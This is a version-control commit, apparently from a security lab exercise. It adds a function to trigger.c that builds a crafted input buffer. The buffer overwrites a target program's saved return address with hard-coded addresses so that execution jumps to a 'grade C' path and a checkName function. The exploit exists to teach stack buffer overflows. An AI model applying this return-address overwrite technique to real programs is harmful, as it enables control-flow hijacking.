0fc9132c5ff30e8ae3eb39bd7bf8802523b717e2
vineetk32 <vineetk32@310eed46-5812-bb6a-ce30-aefc55b4996e>
2012-03-24 18:42:45 +0000

    Added jump to main.

--- trunk/src/trigger.c
+++ trunk/src/trigger.c
@@ -46,7 +46,32 @@ void fnCaseD(){
 	//inp[69] = '\0';
 
 }
+void fnCaseC(){
 
+	char* inp = malloc(sizeof(char) * 108);
+	strcpy(inp,"Arun");
+	int i;
+	for(i = 50; i < 108; ++i)
+	{
+		inp[i] = '\0';
+	}
+	//Over writing the rip to return to grade = 'C'
+	inp[104] = (char) 0x2e;
+	inp[105] = (char) 0x08;
+	inp[106] = (char) 0x40;
+	inp[107] = (char) 0x00;
+	// Writing the address of checkName
+	inp[64] = (char) 0x69;
+	inp[65] = (char) 0x08;
+	inp[66] = (char) 0x40;
+	inp[67] = (char) 0x00;
+	//inp[65] = (char) 0x07;
+	//fwrte(inp,1,66,stdout);//stdout,inp,66);
+	write(1,inp,108);
+	fflush(stdout);
+	//inp[69] = '\0';
+
+}
 int main(int argc, char**argv)
 {
 	switch(argv[1][0])
@@ -54,6 +79,8 @@ int main(int argc, char**argv)
 		case 'd': fnCaseD();
 			 break;
 		case 'e': fnCaseE();
+			 break;
+		case 'c': fnCaseC();
 			 break;
 		default: printf("Arun");
 			break;
